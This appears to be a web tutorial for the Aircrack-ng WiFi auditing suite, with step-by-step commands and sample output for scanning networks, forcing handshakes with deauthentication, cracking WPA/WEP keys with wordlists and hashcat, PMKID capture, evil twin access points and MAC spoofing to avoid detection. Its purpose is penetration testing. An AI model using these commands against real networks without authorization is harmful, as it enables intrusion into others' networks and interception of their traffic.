Aircrack-ng is a complete suite of tools to assess WiFi network security. It focuses on monitoring, attacking, testing, and cracking WiFi networks — including WEP, WPA/WPA2-PSK, and WPS. Used by penetration testers and ethical hackers to audit wireless networks.

What is Aircrack-ng?

Aircrack-ng is a suite of tools bundled together for WiFi security auditing. It's composed of multiple independent tools that work together, each handling a specific part of the wireless attack process.

The Suite Includes

  • airmon-ng — Enable monitor mode and manage wireless interfaces
  • airodump-ng — Capture packets and scan networks
  • aireplay-ng — Inject packets and perform attacks
  • aircrack-ng — Crack WEP and WPA/WPA2 keys
  • airdecap-ng — Decrypt captured WEP/WPA traffic
  • airbase-ng — Create fake access points
  • airtun-ng — Virtual tunnel interface
  • airolib-ng — Manage pre-computed PMK databases
  • airventriloquist — WPA enterprise attacks
  • packetforge-ng — Create custom packets
💡
Why it matters: WiFi is the most common attack surface for attackers. Understanding Aircrack-ng is essential for anyone serious about wireless security testing.

Key Concepts

  • Monitor Mode — Interface captures ALL WiFi traffic, not just packets addressed to it
  • Managed Mode — Default mode — connects to a single AP
  • BSSID — MAC address of the access point
  • ESSID — WiFi network name (SSID)
  • Handshake — 4-way authentication exchange between client & AP — contains the encrypted PMK
  • PMKID — Alternative attack vector — no client needed
  • Deauth Attack — Forces client to disconnect, triggers new handshake

Hardware Requirement: You need a WiFi adapter that supports monitor mode and packet injection. Common compatible adapters: Alfa AWUS036NHA, Alfa AWUS036ACH, TP-Link TL-WN722N (v1 only), Panda PAU09.
Step 1: Enable Monitor Mode
1. Check Wireless Interfaces
List all wireless interfaces on your system.
sudo airmon-ng
PHY Interface Driver Chipset phy0 wlan0 ath9k_htc Atheros Communications, Inc. AR9271
2. Kill Conflicting Processes
Stop NetworkManager, wpa_supplicant, etc. that interfere with monitor mode.
sudo airmon-ng check kill
Killing these processes: PID Name 1234 wpa_supplicant 5678 NetworkManager
3. Start Monitor Mode
Enable monitor mode on wlan0 — creates wlan0mon interface.
sudo airmon-ng start wlan0
Interface wlan0mon enabled. Monitor mode enabled on wlan0mon
4. Verify Monitor Mode
iwconfig
wlan0mon IEEE 802.11 Mode:Monitor Frequency:2.437 GHz
5. Stop Monitor Mode
When done — return to normal mode.
sudo airmon-ng stop wlan0mon
6. Restart NetworkManager
After stopping monitor mode, restart networking.
sudo systemctl start NetworkManager
Step 2: Scan Networks (airodump-ng)
7. Scan All WiFi Networks
Display all nearby APs with BSSID, channel, encryption, clients.
sudo airodump-ng wlan0mon
BSSID CH ENC ESSID AA:BB:CC:DD:EE:FF 6 WPA2 HomeWiFi 11:22:33:44:55:66 11 WPA2 Office_Net 77:88:99:AA:BB:CC 1 WEP OldRouter
8. Scan Specific Band (5GHz)
sudo airodump-ng --band a wlan0mon
9. Scan Both Bands
sudo airodump-ng --band abg wlan0mon
10. Target Specific Network
Lock onto a specific AP — capture all packets including handshake.
sudo airodump-ng -c <channel> --bssid <bssid> -w capture wlan0mon
CH 6 ][ Elapsed: 30s ][ 2024-01-15 12:34 BSSID PWR Beacons #Data CH ENCR ESSID AA:BB:CC:DD:EE:FF -45 150 234 6 WPA2 HomeWiFi BSSID STATION PWR Packets AA:BB:CC:DD:EE:FF 11:22:33:44:55:66 -50 45
11. Filter by Encryption
sudo airodump-ng --encrypt WPA2 wlan0mon
12. Filter by ESSID
sudo airodump-ng --essid HomeWiFi wlan0mon
Step 3: Capture Handshake (WPA/WPA2)
13. Start Capture on Target
Lock on target BSSID + channel, save to `capture-01.cap`.
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
14. Deauth Attack (Force Handshake) ⚠ AUTHORIZED USE ONLY
Send deauth packets to force client reconnection → triggers new handshake.
sudo aireplay-ng --deauth 10 -a <bssid> wlan0mon
12:34:56 Sending DeAuth to broadcast -- BSSID: [AA:BB:CC:DD:EE:FF] 12:34:56 Sending DeAuth (10 times)...
15. Targeted Deauth (Specific Client) ⚠ AUTHORIZED USE ONLY
More precise — forces only one client to reconnect.
sudo aireplay-ng --deauth 10 -a <bssid> -c <client-mac> wlan0mon
16. Check for Handshake
Look for `WPA handshake: AA:BB:CC:DD:EE:FF` in top-right of airodump.
sudo aircrack-ng capture-01.cap
Opening capture-01.cap Read 234 packets. # BSSID ESSID 1 AA:BB:CC:DD:EE:FF HomeWiFi WPA (1 handshake)
Step 4: Crack the Handshake
17. Dictionary Attack (Most Common)
Try each password from a wordlist against the captured handshake.
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
Opening capture-01.cap Read 234 packets. Aircrack-ng 1.7 [00:00:15] 12345/14344392 keys tested (823.45 k/s) KEY FOUND! [ password123 ] Master Key : A1 B2 C3 D4 E5 F6 ... Transient Key : 12 34 56 78 9A BC ...
18. Target Specific BSSID
If multiple networks captured, specify target.
aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF capture-01.cap
19. Target Specific ESSID
aircrack-ng -w rockyou.txt -e HomeWiFi capture-01.cap
20. Multi-Core Performance
Use all CPU cores for faster cracking.
aircrack-ng -w rockyou.txt -p 8 capture-01.cap
21. Multiple Wordlists
aircrack-ng -w wordlist1.txt,wordlist2.txt,wordlist3.txt capture-01.cap
WEP Cracking (Old but Fast)
⚠️
Note: WEP is deprecated and rarely found. But if you find one, it can be cracked in minutes.
22. Start WEP Capture
sudo airodump-ng -c 1 --bssid <bssid> -w wep-capture wlan0mon
23. ARP Replay Attack (Speed up IVs) ⚠ AUTHORIZED USE ONLY
Generate traffic to collect more IVs quickly.
sudo aireplay-ng --arpreplay -b <bssid> -h <your-mac> wlan0mon
24. Fake Authentication ⚠ AUTHORIZED USE ONLY
sudo aireplay-ng --fakeauth 0 -a <bssid> -h <your-mac> wlan0mon
25. Crack WEP
Needs ~50,000+ IVs for reliable cracking.
aircrack-ng wep-capture-01.cap
PMKID Attack (No Client Needed)

Modern attack — no client required. Works on WPA2 networks with roaming enabled.

26. Capture PMKID ⚠ AUTHORIZED USE ONLY
Use hcxdumptool to grab PMKID from AP.
sudo hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
27. Convert for Hashcat
hcxpcapngtool -o hash.hc22000 pmkid.pcapng
28. Crack with Hashcat (GPU)
Way faster than aircrack on handshakes.
hashcat -m 22000 hash.hc22000 rockyou.txt
Advanced Techniques
29. Decrypt Captured Traffic
Once you have the password, decrypt the captured .cap.
airdecap-ng -w <password> capture-01.cap
30. Create Fake AP
Set up a rogue access point with airbase-ng.
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon
31. Evil Twin Attack ⚠ AUTHORIZED USE ONLY
Clone a real AP to trick clients into connecting to your fake AP.
sudo airbase-ng -a <target-bssid> -e "HomeWiFi" -c 6 wlan0mon
32. Pre-compute PMK Database
Build PMK database for faster cracking of same SSID.
airolib-ng pmk-db --import essid essids.txt
airolib-ng pmk-db --import passwd rockyou.txt
airolib-ng pmk-db --batch
33. Use PMK Database
aircrack-ng -r pmk-db capture-01.cap
34. Interactive Packet Replay ⚠ AUTHORIZED USE ONLY
sudo aireplay-ng --interactive -b <bssid> -h <your-mac> wlan0mon
35. Change MAC Address (Stealth)
Avoid detection by randomizing your adapter MAC.
sudo macchanger -r wlan0mon

Troubleshooting

"No wireless interfaces found"

  • Adapter not connected → lsusb or lspci
  • Driver missing → install correct driver
  • Wrong VM → USB passthrough needed (VMware/VirtualBox)

"Monitor mode fails"

  • Adapter doesn't support monitor mode
  • Run sudo airmon-ng check kill first
  • Try iwconfig wlan0 mode monitor manually

"No handshake captured"

  • Client not connected — wait for one to connect
  • Wrong channel — verify with airodump
  • Deauth not working — try targeted deauth
  • Distance too far — move closer

"Password not found"

  • Wordlist too small — get bigger wordlist
  • Password not in dictionary → use hashcat with GPU or brute-force
  • WPA3 → use different attack (much harder)
